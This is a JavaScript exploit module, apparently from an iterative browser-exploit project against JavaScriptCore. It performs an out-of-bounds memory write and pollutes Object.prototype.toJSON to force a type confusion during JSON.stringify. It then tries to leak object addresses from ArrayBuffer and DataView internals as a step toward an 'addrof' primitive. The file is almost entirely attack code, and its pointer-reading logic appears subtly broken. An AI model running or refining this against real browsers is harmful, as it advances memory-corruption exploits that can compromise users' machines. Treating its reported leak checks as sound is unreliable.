// js/script3/testArrayBufferVictimCrash.mjs (v58_StableC1LeakInMemory)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V58_SCLIM = "OriginalHeisenbug_TypedArrayAddrof_v58_StableC1LeakInMemory";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;

let leak_target_buffer_v58 = null;
let leak_target_dataview_v58 = null;

let victim_typed_array_ref_v58 = null;
let probe_call_count_v58 = 0;
let all_probe_interaction_details_v58 = [];
let first_call_details_object_ref_v58 = null; // Referência ao C1_details

const PROBE_CALL_LIMIT_V58 = 5; // Reduzido, pois esperamos erro de circularidade cedo

function toJSON_TA_Probe_StableC1LeakInMemory_v58() {
    probe_call_count_v58++;
    const call_num = probe_call_count_v58;
    let current_call_details = {
        call_number: call_num,
        probe_variant: FNAME_MODULE_TYPEDARRAY_ADDROF_V58_SCLIM,
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v58),
        this_is_C1_details_obj: (this === first_call_details_object_ref_v58 && first_call_details_object_ref_v58 !== null),
        C1_payloads_assigned: false,
        error_in_probe: null
    };
    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. Type: ${current_call_details.this_type}. IsVictim? ${current_call_details.this_is_victim}. IsC1? ${current_call_details.this_is_C1_details_obj}.`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V58) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Probe call limit.`, "warn");
            all_probe_interaction_details_v58.push(current_call_details);
            return { recursion_stopped_v58: true, call: call_num };
        }

        if (call_num === 1 && current_call_details.this_is_victim) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is victim. Creating C1_details & adding self_ref.`, "info");
            first_call_details_object_ref_v58 = current_call_details;
            current_call_details.self_ref = current_call_details; // Adiciona auto-referência
            all_probe_interaction_details_v58.push(current_call_details);
            return current_call_details;
        }
        else if (current_call_details.this_is_C1_details_obj && current_call_details.this_type === '[object Object]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: TYPE CONFUSION ON C1_DETAILS_OBJECT ('this')! Assigning TypedArray payloads...`, "vuln");
            if (leak_target_buffer_v58) {
                this.payload_ArrayBuffer = leak_target_buffer_v58;
                current_call_details.C1_payloads_assigned = true;
            }
            if (leak_target_dataview_v58) {
                this.payload_DataView = leak_target_dataview_v58;
                current_call_details.C1_payloads_assigned = true;
            }
            // Não remover self_ref aqui. Deixar JSON.stringify principal lidar com isso (esperado erro).
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: C1_details modified. Keys: ${Object.keys(this).join(',')}`, "info");
            all_probe_interaction_details_v58.push(current_call_details);
            return this; // Retorna C1_details modificado
        }
        // Se a sonda for chamada para os TypedArrays injetados (improvável se C1 causa ciclo antes)
        else if ((this === leak_target_buffer_v58 && current_call_details.this_type === '[object ArrayBuffer]') ||
                 (this === leak_target_dataview_v58 && current_call_details.this_type === '[object DataView]') ) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' IS AN INJECTED TYPED OBJECT ${current_call_details.this_type}. Returning simple marker.`, "warn");
            all_probe_interaction_details_v58.push(current_call_details);
            return { processed_leak_target: true, type: current_call_details.this_type }; // Evitar leitura aqui, pois JSON.stringify principal já pode ter falhado.
        }
        else {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is unexpected: ${current_call_details.this_type}.`, "warn");
            all_probe_interaction_details_v58.push(current_call_details);
            return { generic_marker_v58: call_num };
        }
    } catch (e) {
        current_call_details.error_in_probe = e.message;
        const FNAME_CURRENT_TEST_REF = FNAME_MODULE_TYPEDARRAY_ADDROF_V58_SCLIM;
        logS3(`[${current_call_details.probe_variant}] Call #${call_num}: CRITICAL ERROR in probe: ${e.name} - ${e.message}`, "critical", FNAME_CURRENT_TEST_REF);
        all_probe_interaction_details_v58.push(current_call_details);
        return { error_marker_v58: call_num };
    }
}

export async function executeTypedArrayVictimAddrofTest_StableC1LeakInMemory() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V58_SCLIM}.triggerAndLog`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug (StableC1LeakInMemory) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V58_SCLIM} Init...`;

    probe_call_count_v58 = 0;
    all_probe_interaction_details_v58 = [];
    victim_typed_array_ref_v58 = null;
    first_call_details_object_ref_v58 = null; // Crucial para acessar o C1_details modificado

    leak_target_buffer_v58 = new ArrayBuffer(0x80);
    leak_target_dataview_v58 = new DataView(new ArrayBuffer(0x80));

    let errorCapturedMain = null;
    let rawStringifyOutput = "N/A"; // Default
    let stringifyOutput_parsed = null; // Default

    let addrof_A_result = { success: false, msg: "Addrof ArrayBuffer: Default (v58)" };
    let addrof_B_result = { success: false, msg: "Addrof DataView: Default (v58)" };
    // ... (fillPattern etc.)

    let pollutionApplied = false;
    let originalToJSONDescriptor = null;
    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed. Value: ${toHex(OOB_WRITE_VALUE)}.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        victim_typed_array_ref_v58 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE));
        // ...

        const ppKey = 'toJSON';
        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_StableC1LeakInMemory_v58, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            logS3(`  Object.prototype.toJSON polluted. Calling JSON.stringify(victim_typed_array_ref_v58)...`, "info", FNAME_CURRENT_TEST);

            try {
                rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v58);
                logS3(`  JSON.stringify completed. Raw Stringify Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_TEST);
                stringifyOutput_parsed = JSON.parse(rawStringifyOutput); // Provavelmente vai falhar se auto-ref funcionou.
            } catch (e_stringify_main) {
                errorCapturedMain = e_stringify_main; // Captura o TypeError de estrutura circular aqui!
                rawStringifyOutput = `ERROR_DURING_STRINGIFY: ${e_stringify_main.message}`; // Guarda a mensagem de erro
                logS3(`  JSON.stringify FAILED as expected due to circular ref (GOOD!): ${e_stringify_main.name} - ${e_stringify_main.message}`, "vuln", FNAME_CURRENT_TEST);
                stringifyOutput_parsed = { error_parsing_stringify_output: rawStringifyOutput, parse_error: e_stringify_main.message };
            }

            let heisenbugOnC1 = false;
            const call2Details = all_probe_interaction_details_v58.find(d => d.call_number === 2 && d.this_is_C1_details_obj);
            if (call2Details && call2Details.C1_payloads_assigned) {
                heisenbugOnC1 = true;
                logS3(`  EXECUTE: HEISENBUG on C1_details (Call #2) & PAYLOAD ASSIGNMENT CONFIRMED!`, "vuln", FNAME_CURRENT_TEST);

                // **NOVA LÓGICA DE EXTRAÇÃO "OFFLINE"**
                logS3("STEP 3: Attempting 'offline' addrof from C1_details in memory...", "warn", FNAME_CURRENT_TEST);
                if (first_call_details_object_ref_v58 && first_call_details_object_ref_v58.payload_ArrayBuffer === leak_target_buffer_v58) {
                    try {
                        let view = new DataView(first_call_details_object_ref_v58.payload_ArrayBuffer);
                        const offset = JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET;
                        if (view.byteLength >= (offset + 8)) {
                            let low = view.getUint32(offset, true);
                            let high = view.getUint32(offset + 4, true);
                            let ptr = new AdvancedInt64(low, high);
                            if (ptr.high() > 0x70000000 || ptr.low() > 0x10000000 || (ptr.high() & 0xFF000000) === 0x80000000) {
                                addrof_A_result.success = true;
                                addrof_A_result.msg = `V58 SUCCESS (Offline AB Read): ${ptr.toString(true)} from offset ${toHex(offset)}`;
                            } else { addrof_A_result.msg = `V58 Offline AB Read value ${ptr.toString(true)} not a pointer pattern.`; }
                        } else { addrof_A_result.msg = `V58 Offline AB too small for read at ${toHex(offset)}.`;}
                    } catch (e_offline_A) { addrof_A_result.msg = `V58 Offline AB Read Error: ${e_offline_A.message}`; }
                } else { addrof_A_result.msg = "V58 C1_details.payload_ArrayBuffer not found or not the target."; }

                if (first_call_details_object_ref_v58 && first_call_details_object_ref_v58.payload_DataView === leak_target_dataview_v58) {
                     try {
                        let view = first_call_details_object_ref_v58.payload_DataView; // É uma DataView
                        const offset = JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
                         if (view.byteLength >= (offset + 8)) {
                            let low = view.getUint32(offset, true);
                            let high = view.getUint32(offset + 4, true);
                            let ptr = new AdvancedInt64(low, high);
                            if (ptr.high() > 0x70000000 || ptr.low() > 0x10000000 || (ptr.high() & 0xFF000000) === 0x80000000) {
                                addrof_B_result.success = true;
                                addrof_B_result.msg = `V58 SUCCESS (Offline DV Read): ${ptr.toString(true)} from offset ${toHex(offset)}`;
                            } else { addrof_B_result.msg = `V58 Offline DV Read value ${ptr.toString(true)} not a pointer pattern.`; }
                        } else { addrof_B_result.msg = `V58 Offline DV too small for read at ${toHex(offset)}.`;}
                    } catch (e_offline_B) { addrof_B_result.msg = `V58 Offline DV Read Error: ${e_offline_B.message}`; }
                } else { addrof_B_result.msg = "V58 C1_details.payload_DataView not found or not the target."; }

            } else {
                logS3(`  EXECUTE: ALERT: Heisenbug on C1_details (Call #2) or payload assignment NOT confirmed.`, "error", FNAME_CURRENT_TEST);
            }

            if (addrof_A_result.success || addrof_B_result.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V58_SCLIM}: Addr SUCCESS!`;
            } else if (heisenbugOnC1 || (errorCapturedMain && errorCapturedMain.message.includes("circular structure"))) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V58_SCLIM}: Heisenbug OK, Addr Fail`;
            } else {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V58_SCLIM}: No Heisenbug?`;
            }

        } catch (e_str_outer) { // Este catch pode pegar erros da lógica de análise também
            if (!errorCapturedMain) errorCapturedMain = e_str_outer; // Só define se não foi pego pelo stringify
            logS3(`  CRITICAL ERROR during result processing: ${e_str_outer.name} - ${e_str_outer.message}${e_str_outer.stack ? '\n'+e_str_outer.stack : ''}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V58_SCLIM}: Result Processing ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
                logS3(`  Object.prototype.toJSON restored.`, "info", FNAME_CURRENT_TEST);
            }
        }
    } catch (e_overall_main) {
        if (!errorCapturedMain) errorCapturedMain = e_overall_main;
        logS3(`  CRITICAL ERROR in main test execution: ${e_overall_main.name} - ${e_overall_main.message}${e_overall_main.stack ? '\n'+e_overall_main.stack : ''}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V58_SCLIM} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v58}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof A: Success=${addrof_A_result.success}, Msg='${addrof_A_result.msg}'`, addrof_A_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof B: Success=${addrof_B_result.success}, Msg='${addrof_B_result.msg}'`, addrof_B_result.success ? "good" : "warn", FNAME_CURRENT_TEST);

        // ... (limpeza de variáveis globais) ...
        victim_typed_array_ref_v58 = null;
        all_probe_interaction_details_v58 = [];
        probe_call_count_v58 = 0;
        first_call_details_object_ref_v58 = null;
        leak_target_buffer_v58 = null;
        leak_target_dataview_v58 = null;
    }
    return {
        errorCapturedMain: errorCapturedMain,
        stringifyResult: stringifyOutput_parsed, // Pode ser um objeto de erro
        rawStringifyForAnalysis: rawStringifyOutput,
        all_probe_calls_for_analysis: [...all_probe_interaction_details_v58],
        total_probe_calls: probe_call_count_v58,
        addrof_A_result: addrof_A_result,
        addrof_B_result: addrof_B_result
    };
};
